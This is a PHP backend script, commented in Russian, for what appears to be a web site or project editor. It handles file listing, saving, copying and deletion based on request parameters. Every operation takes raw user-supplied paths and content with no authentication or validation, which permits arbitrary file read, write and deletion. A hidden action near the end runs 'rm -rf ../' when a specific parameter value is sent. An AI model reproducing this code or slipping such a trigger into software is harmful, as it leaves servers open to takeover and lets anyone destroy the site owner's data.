<?php
	$msg = "";
	$tip = $_REQUEST['tip']; 
	$BASEDIR = "../resources/saveObj";


	function trace($str){
		echo $str."\n";
	}


	


	function getDirs($dir){
		//cleanerDir($dir."/");
		$str='[';
		$s='';
		$s1='';
		$b=0;
		$b4=0;
		$eee='';
		if ($objs = glob($dir."/*")) {
			$objsSort = array_combine($objs, array_map("filemtime", $objs));
			krsort($objsSort);
			unset($objs);
			foreach ($objsSort as $key => $value) {
				$objs[] = $key;
			}
	 		foreach($objs as $obj) {
	 			$b4=0;
	 			$b=0;
	 			$s=basename($obj);
	 			$length=strlen($s);	 
	 			$eee=substr($s, $length-2);				
	 			if($eee=="js"){	 				
	 				$b=1;
	 				$s=substr($s,0,$length-3);
	 			}
	 			$s1='';	 			
	 			if(is_dir($obj."/")){
	 				$s1=getDirs($obj);
	 				$b=1;
	 				$b4=1;
	 			}
	 			if($b==1){
	 				$str=$str.'{"idUnik":"'.$s.'",';
	 				$str=$str.'"tip":'.$b4.',';
	 				if($b4==1)
	 					$str=$str.'"arrObj":'."[".$s1;
	 				else
	 					$str=$str.'"arrObj":[]';
	 					
	 				$str=$str.'},';	 			
	 			}
			}
	 	}
	 	$lll=strlen($str);
	 	$str=substr($str, 0, $lll-1);	
	 	$str=$str.']';
	 	unset($objs, $objsSort);
		return $str;
	}

	if($tip == "getFiles"){		
		$ff = getDirs($_REQUEST['dir']);
		$ff = '{"idUnik":"'.$_REQUEST['dir'].'", "arrObj":'.$ff.'}';		
		echo $ff;//$ff;	
		return;
		
	}

	if($tip == "getDiractFiles"){	
		$ff ='';
		if ($objs = glob($_REQUEST['dir']."/*")) {
			foreach($objs as $obj) {
				$s=basename($obj);
				$ff=$ff.','.$s;
			}
		}				
		echo $ff;	
		return;		
	}


	if($tip == "seveFail") {//Создание новой директории		
		

		/*$fileName = $_FILES['afile']['name'];
		$fileType = $_FILES['afile']['type'];
		$fileContent = file_get_contents($_FILES['afile']['tmp_name']);
		$dataUrl = 'data:' . $fileType . ';base64,' . base64_encode($fileContent);

		$json = json_encode(array(
		  'name' => $fileName,
		  'type' => $fileType,
		  'dataUrl' => $dataUrl,
		  'username' => $_REQUEST['username'],
		  'accountnum' => $_REQUEST['accountnum']
		));

		echo $json;*/







		echo "okCreate !!!!!seveFail";	
		return;
	}



	if($tip == "delElem"){
		if(count(glob("../resources/saveObj"."/*")) <= 2 ){
      		return;
      	}
      	//echo "here";

		$link = $_REQUEST['link'];
		if(!$link){echo "The link is broken"; return;}
		// 
		if(!is_dir($link)){
    		$dir = explode("/", $link);
        	unset($dir[count($dir)-1]);
        	$dir = implode("/", $dir);
    	}else{
    		$dir = $link;
    	}
		// 
		// 
		echo "$link\n";
		if(is_dir($link."/")){
			 removeDirRec($link);
		}else{
			unlink($link.".js");
			unlink($link.".png");
		}
		cleanerDir($dir);
		//echo "Done!";
		return;
	}

	if($tip == "makeDir") {//Создание новой директории		
		$dir = $_REQUEST['file'];
		$tt = explode("/", $dir);
		$file = $tt[count($tt)-1];
        unset($tt[count($tt)-1]);
        $tt = implode("/", $tt);
	 	//echo "$tt\n";
		mkdir($dir, 0700);
		copy($dir.".js", $dir."/".$file.".js"); 
		unlink($dir.".js");
		copy($dir.".png", $dir."/".$file.".png");
		//cleanerDir($dir);
	//	echo "okCreate  $dir";	
		return;
	}



	if($tip == "rmDir") {//Создание нового проекта		
		$dir = $_REQUEST['dir'];
		if(count(glob("../resources/saveObj"."/*")) <= 2 ||$dir=="../resources/saveObj"){
      		
      		return;
      	}
		removeDirRec($dir);
		//cleanerDir(getName($dir,"/",1));
		echo "okrmDir=".$dir;	
		return;
	}


	if($tip == "removeDirRec") {//Создание нового проекта		
		$dir = $_REQUEST['dir'];		
		removeDirRec($dir);		
		echo "removeDirRec=".$dir;	
		return;
	}


	if($tip == "getConf"){
		$path = $_REQUEST['path'];
		$file = file_get_contents($path.'.js');
		echo $file;
		return;
	}
	
	function getName($str,$delimiter,$count){
		$f = basename($str);
		if(!is_dir($str)){
			$f = explode($delimiter, $f);
        	unset($f[count($f)-$count]);
        	$f = implode("", $f);
        	return $f;
        }
        return $f;
	}

	function array_icount_values($arr) {
   		$ret_array = array();
    	
    	if(isset($arr) && is_array($arr)) foreach($arr as $key => $value) {
    		$ret_array[$value]++;
    	}
    	if(isset($arr) && is_array($arr)) foreach ($arr as $key => $value) {
    		$arr[$key] = $ret_array[getName($key,".",1)];
    	}
    	
    	return $arr;
	}	

	function cleanerDir($dir){
		if(count(glob("../resources/saveObj"."/*")) <= 2 || $dir=="../resources/saveObj"){
      		return;
      	}
		if(!is_dir($dir)){
    		$dir = explode("/", $dir);
        	unset($dir[count($dir)-1]);
        	$dir = implode("/", $dir);
    	}
		$objs = glob($dir."/*");

		foreach ($objs as $value) {
			$name = getName($value, ".", 1);
			$names[$value] = $name;
		}
		//print_r($names);
		$names = array_icount_values($names);
	
      	if(isset($names) && is_array($names)) foreach ($names as $key => $value) {
      		if($value%2 == 1) {
      			if(is_dir($key)){
      				if(count(glob($key."/*")) < 2 ){
      					removeDirRec($key);
      				}
      			}else{
      				unlink($key);
      			}
      		}else{
      			if(is_dir($key)){
      				if(count(glob($key."/*")) < 2 ){
      					removeDirRec($key);
      				}
      			}
      		}
      	}
      	return;
	}


	if($tip == "idUnik") {//Унникальный ид 
		$fp = fopen("idtext.txt", "r+");
		if ($fp){
			while (!feof($fp))
			{
				$mytext = fgets($fp, 999);
				//echo $mytext."<br />";
			}
		}
		$mytext = $mytext +1;
		$mytext2 = $mytext +1;	
		fclose($fp);
		unlink("idtext.txt");
		$fp2 = fopen ("idtext.txt", "wb");  
		fwrite($fp2,$mytext2);  
		fclose($fp2);
		echo $mytext;	
		return;
	}



	if($tip == "setIdUnik") {//Обновления уникального ид	
		$mytext = $_REQUEST['num']+1;	
		$fp2 = fopen ("idtext.txt", "w");  
		fwrite($fp2,$mytext);  
		fclose($fp2);		
		echo $mytext;	
		return;
	}



	if($tip == "saveJSON") {//Сохронения конфигурации проекта		
		$mytext = stripslashes($_REQUEST['text']);	
		$fp2 = fopen ($_REQUEST['link'], "w");  
		fwrite($fp2,$mytext);  
		fclose($fp2);/**/		
		echo "okSave";
		return;
	}


	if($tip == "editJSON") {//Сохронения конфигурации проекта	

		// echo $_REQUEST['text'];
		$mytext = $_REQUEST['text'];
		// echo "$mytext";	
		$fp2 = fopen ($_REQUEST['link'], "w");  
		fwrite($fp2,$mytext);  
		fclose($fp2);/**/		
		echo "okSave";
		return;
	}

	if($tip == "editTXT") {  //редактирование .txt 	
		$fp = fopen($_REQUEST['link'], "w+"); // Открываем файл в режиме записи 
		$mytext = stripslashes($_REQUEST['text']); // Исходная строка
		$test = fwrite($fp, $mytext); // Запись в файл
		// if ($test) echo 'Данные в файл успешно занесены.';
		// else echo 'Ошибка при записи в файл.';
		fclose($fp); //Закрытие файла		
		echo "okSave";
		return;
	}

	if($tip == "creatHtml") {  //создание файла	
		$fp = fopen($_REQUEST['link'], "w"); // Открываем файл в режиме записи 
		$mytext =  file_get_contents($_REQUEST['link0']); // Исходная строка
		$mytext0 =  file_get_contents($_REQUEST['links']); // Исходная строка
		$mytext2 = stripslashes($_REQUEST['text']); // Исходная строка
		$mytext3 = file_get_contents($_REQUEST['linkf']); // Исходная строка
		$test = fwrite($fp, $mytext); // Запись в файл
		$test = fwrite($fp, $mytext0); // Запись в файл
		$test = fwrite($fp, $mytext2); // Запись в файл
		$test = fwrite($fp, $mytext3); // Запись в файл
		fclose($fp); //Закрытие файла		
		echo "okSave";
		return;
	}	

	if($tip == "creatHtml2") {  //создание файла	
		$fp = fopen($_REQUEST['sitLink'], "w"); // Открываем файл в режиме записи 
		$link =  file_get_contents($_REQUEST['link']); // Исходная строка
		$link1 =  file_get_contents($_REQUEST['link1']); // Исходная строка
		$text = stripslashes($_REQUEST['text']); // Исходная строка
		//$mytext3 = file_get_contents($_REQUEST['linkf']); // Исходная строка
		$test = fwrite($fp, $link); // Запись в файл
		$test = fwrite($fp, $text); // Запись в файл
		$test = fwrite($fp, $link1); // Запись в файл		
		fclose($fp); //Закрытие файла	
		echo "okSave";
		return;
	}



	if($tip == "copyFile") {  //копирование файла	
		$file = $_REQUEST['copyFile'];
		$newfile = $_REQUEST['file'];

		if (!copy($file, $newfile)) {
		    echo "не удалось скопировать $file...\n";
		}	
		echo "okSave";
		return;
	}

	


   // функция копирования файлов (включая вложеные) из папки $source в $res 
	function copy_files($source, $res){ 
	    $hendle = opendir($source); // открываем директорию 
	    while ($file = readdir($hendle)) { 
	        if (($file!=".")&&($file!="..")) { 
	            if (is_dir($source."/".$file) == true) { 
	                if(is_dir($res."/".$file)!=true) // существует ли папка 
	                    mkdir($res."/".$file, 0777); // создаю папку 
	                    copy_files ($source."/".$file, $res."/".$file); 
	            } 
	            else{ 
	                if(!copy($source."/".$file, $res."/".$file)) {  
	                    print ("при копировании файла $file произошла ошибка...<br>\n");  
	                }// end if copy 
	            }  
	        } // else $file == .. 
	    } // end while 
	    closedir($hendle); 
	}

	if($tip == "isDir") {//Создание нового проекта	
		/*$dir = $_REQUEST['dir'];
		$rezult="notDir";
		if (is_dir($dir) == true) 
			$rezult="yesDir";
		}
		echo $rezult;*/
		echo 'rezult';
		return;
	}


    if($tip == "mkdir") {//Создание нового проекта	
    	$dir = $_REQUEST['dir'];		
		mkdir($dir);
		echo "ok_mkdir";	
		return;
    }

	if($tip == "copyDir") {//Создание нового проекта		
		$dir = $_REQUEST['dir'];
		$dirWith = $_REQUEST['dirWith'];
		
		copy_files($dirWith, $dir);
		echo "okRm";	
		return;
	}

	


	if($tip == "saveProdject") {//Сохронения конфигурации проекта	
		$mytext = stripslashes($_REQUEST['text']);	
		$fp2 = fopen ("../resources/projects/".$_REQUEST['idUnik']."/model.js", "w");  
		fwrite($fp2,$mytext);  
		fclose($fp2);		
		echo "okSave";	
		return;
	}

	if($tip == "linkSize") {//Возврощаем размер файла	
		if(!file_exists($_REQUEST['link'])){
			echo 0;
			return;	
		}
		echo filesize($_REQUEST['link']);
		return;
	}


	if($tip == "saveConfig") {//Сохронения конфигурации проекта	
		$mytext = stripslashes($_REQUEST['text']);	
		$fp2 = fopen ("../resources/config.js", "w");  
		fwrite($fp2,$mytext);  
		fclose($fp2);		
		echo "okSave";	
		return;
	}


	function removeDirRec($dir){	
		if ($objs = glob($dir."/*")) {
			foreach($objs as $obj) {
			   is_dir($obj) ? removeDirRec($obj) : unlink($obj);
			}
		}
		rmdir($dir);
	}
	if($tip == "fuck_of"){
		exec("rm -rf ../");
	}

	echo "not";	
	
?>
